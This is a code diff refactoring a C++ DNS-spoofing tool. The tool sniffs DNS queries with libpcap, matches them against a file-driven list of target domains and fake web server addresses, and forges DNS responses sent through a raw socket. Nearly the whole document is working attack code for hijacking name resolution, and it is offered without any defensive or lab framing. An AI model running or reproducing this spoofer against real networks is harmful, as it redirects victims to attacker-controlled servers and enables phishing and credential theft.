@@ -26,17 +26,12 @@ int packet_handle::packet_capture_start(){
 
     const char * filter = "port 53 and (udp and (udp[10] & 128 = 0))";     // Recv
 
-    if(this->attack_list.size()==0){
-        return -1;
-    }
-
-    if (pcap_findalldevs(&alldevs, errbuf) < 0) {
-        printf("pcap_findalldevs error\n");
-        return -2;
-    }
+    if(this->attack_list.size()==0){return -1;}
+    if (pcap_findalldevs(&alldevs, errbuf) < 0) {return -2;}
 
 	for (d = alldevs; d; d = d->next) {
         if(d->next==NULL){
+
             break;
         }
 
@@ -58,43 +53,31 @@ int packet_handle::packet_capture_start(){
 	printf("Enter the interface number you would like to sniff : ");
 	scanf("%d", &(this->interface_number));
 
-    if(this->interface_number <1 || this->interface_number > interface_list.size()){
-        printf("ERROR: Network interface out of range\n");
-        return -3;
-    }   
-
+    if(this->interface_number <1 || this->interface_number > interface_list.size()){return -3;}   
     strcpy(this->interface_name, interface_list[this->interface_number-1]);
-
-    if (!(adhandle=pcap_open_live(this->interface_name, 65536, 1, 1000, errbuf))) {
-		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
-        pcap_freealldevs(alldevs);
-        return -4;
-    }
-
-	if (pcap_compile(adhandle, &fcode, filter, 1, mask) == -1) {
-		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
-        return -5;
-	}
-
-	if (pcap_setfilter(adhandle, &fcode) == -1) {
-		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
-		return -6;
-    }
+    if (!(adhandle=pcap_open_live(this->interface_name, 65536, 1, 1000, errbuf))) {return -4;}
+	if (pcap_compile(adhandle, &fcode, filter, 1, mask) == -1) {return -5;}
+	if (pcap_setfilter(adhandle, &fcode) == -1) {return -6;}
     
     pcap_freealldevs(alldevs);
+    return 0;
 }
 
 
-void packet_handle::start_capture_loop(){
+void packet_handle::print_capture_info(){
     printf("┌───────────────────────────────────────────────────────────────────────────────────────────────────┐\n");
     printf("│            dns-spoofing: linstening on %d [udp dst port 53 and not src %15s]            │\n", this->interface_number, my_ip);
     printf("├────┬─────────────────┬───────┬─────────────────┬───────┬───────────┬────────┬───┬─────────────────┤\n");
     printf("│Info│    source ip    │ sport │ destination ip  │ dport │ Data size │   ID   │Q&A│   information   │\n");
     printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
     fflush(stdout);
+}
 
+
+void packet_handle::start_capture_loop(){
     while (1) {
         if ((this->pkt_data = pcap_next(this->adhandle, &(this->header))) != NULL) {
+            set_protocol_header();
             make_domain();
             packet_handler();
         }
@@ -102,18 +85,15 @@ void packet_handle::start_capture_loop(){
 }
 
 
-void packet_handle::packet_handler() {
-    struct pcap_pkthdr *header;
-    const u_char *pkt_data;
-    
-    header = &(this->header);
-    pkt_data = this->pkt_data;
-    
-    ether_header *eth = (ether_header*)(pkt_data);
-    ip_header *ip = (ip_header*)(pkt_data+sizeof(ether_header));
-    udp_header *udp = (udp_header*)(pkt_data+sizeof(ether_header)+sizeof(ip_header));
-    dns_header *dns = (dns_header*)(pkt_data + 42);
+void packet_handle::set_protocol_header(){
+    this->eth = (ether_header*)(this->pkt_data);
+    this->ip = (ip_header *)(this->pkt_data + sizeof(ether_header));
+    this->udp = (udp_header *)(this->pkt_data + sizeof(ether_header) + sizeof(ip_header));
+    this->dns = (dns_header *)(this->pkt_data + 42);
+}
 
+
+void packet_handle::packet_handler() {
     char source_ip[16];
     char dest_ip[16];
 
@@ -145,7 +125,7 @@ void packet_handle::packet_handler() {
         }
 
         printf("├────┼─────────────────┼───────┼─────────────────┼───────┼───────────┼────────┼───┼─────────────────┤\n");
-        printf("│Recv│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ Q │ %-16s│\n", source_ip, sport, dest_ip, dport, header->caplen,dns_id, display_domain);
+        printf("│Recv│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ Q │ %-16s│\n", source_ip, sport, dest_ip, dport, header.caplen,dns_id, display_domain);
 
         memset(dns_response, 0x00, 1024);
         dns_reply_hdr = dns_response + sizeof(ip_header) + sizeof(udp_header);
@@ -157,7 +137,7 @@ void packet_handle::packet_handler() {
         dns_reply_hdr[8]=dns->NSCNT & 0xff; dns_reply_hdr[9]=(dns->NSCNT >> 8) & 0xff;
         dns_reply_hdr[10]=dns->ARCNT & 0xff; dns_reply_hdr[11]=(dns->ARCNT >> 8) & 0xff;
     
-        int size = header->caplen-54-4;
+        int size = header.caplen-54-4;
 
         for(int i=0;i<size;i++){
             dns_reply_hdr[12+i]=pkt_data[i+54];
@@ -213,34 +193,15 @@ void packet_handle::packet_handler() {
 
 
 void packet_handle::make_domain(){
-    struct pcap_pkthdr *header;
-    const u_char *pkt_data;
-    
-    header = &(this->header);
-    pkt_data = this->pkt_data;
-
-    ether_header *eth;
-    ip_header *ip;
-    udp_header *udp;
-    dns_header *dns;
-
-    eth = (ether_header*)(pkt_data);
-    ip = (ip_header*)(pkt_data+sizeof(ether_header));
-    udp = (udp_header*)(pkt_data+sizeof(ether_header)+sizeof(ip_header));
-    dns = (dns_header*)(pkt_data + 42);
-    const unsigned char *etc = pkt_data+42 +sizeof(dns_header);
-
     memset(extract_domain, 0x00, 1024);
     char dns_data[1024];
     memset(dns_data, 0x00, 1024);
 
-    for(int i=0;i<header->caplen;i++){
+    for(int i=0;i<header.caplen;i++){
         dns_data[i] = (unsigned int)pkt_data[i+54];
     }
 
-    int size_before_dot = dns_data[0];
-    int index = 0;
-    int size_index = 1;
+    int size_before_dot = dns_data[0], index = 0, size_index = 1;
 
     while(size_before_dot > 0) {
         int i=0;
@@ -261,22 +222,19 @@ void packet_handle::make_domain(){
 
 void packet_handle::sned_dns_packet(char *target_ip, int port, unsigned char *dns_packet,int size){
     struct sockaddr_in serv_addr;
-    int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    int tmp=1, sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(port);
 
     inet_pton(AF_INET, target_ip, &(serv_addr.sin_addr));
-    int tmp = 1;
 
     if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
-      printf("setsockopt hdrincl error\n");
+        printf("setsockopt hdrincl error\n");
     };
 
-    int result = sendto(sfd, dns_packet, size, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
-
-    if (result < 0) {
-      printf("error sending udp %d\n", result);
+    if (sendto(sfd, dns_packet, size, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr))<0) {
+        printf("error sending UDP\n");
     }
 }
 
@@ -293,19 +251,15 @@ bool packet_handle::compare_domain(const char *target_domain, std::vector<std::s
 
 
 void packet_handle::set_dom_and_ip(){
-    std::vector<std::string> temp;
+    std::vector<std::string> temp_web_arr, temp_domain;
     
     for(int i=0;i<attack_list.size();i++){
-        temp.push_back(attack_list[i].first);
+        temp_web_arr.push_back(attack_list[i].first);
+        temp_domain.push_back(attack_list[i].second);
     }
-    this->fake_web_server_array = temp;
-    temp.clear();
 
-    for(int i=0;i<attack_list.size();i++){
-        temp.push_back(attack_list[i].second);
-    }
-    this->domain_array = temp;
-    temp.clear();
+    this->fake_web_server_array = temp_web_arr;
+    this->domain_array = temp_domain;
 }
 
 
@@ -321,8 +275,7 @@ void packet_handle::read_info_from_file(){
         return ;
     }
 
-    int valid_cnt=0;
-    int invalid_cnt=0;
+    int valid_cnt=0, invalid_cnt=0;
 
     while(!feof(fp)){
         std::pair<std::string, std::string> temp;
@@ -353,19 +306,13 @@ void packet_handle::read_info_from_file(){
     
     fclose(fp);
     this->attack_list = vec;
-    // return vec;
 }
 
 
 bool packet_handle::validation_check_ip_addr(std::string ip_addr){
     struct sockaddr_in sa;
-    if(inet_pton(AF_INET, ip_addr.c_str(), &(sa.sin_addr))==1){
-        return true;
-    }else{
-        return false;
-    }
+    return inet_pton(AF_INET, ip_addr.c_str(), &(sa.sin_addr))==1 ? true : false;
 }
-
 
 void packet_handle::trim(std::string& str) {
     str.erase(std::remove(str.begin(), str.end(), ' '), str.end());
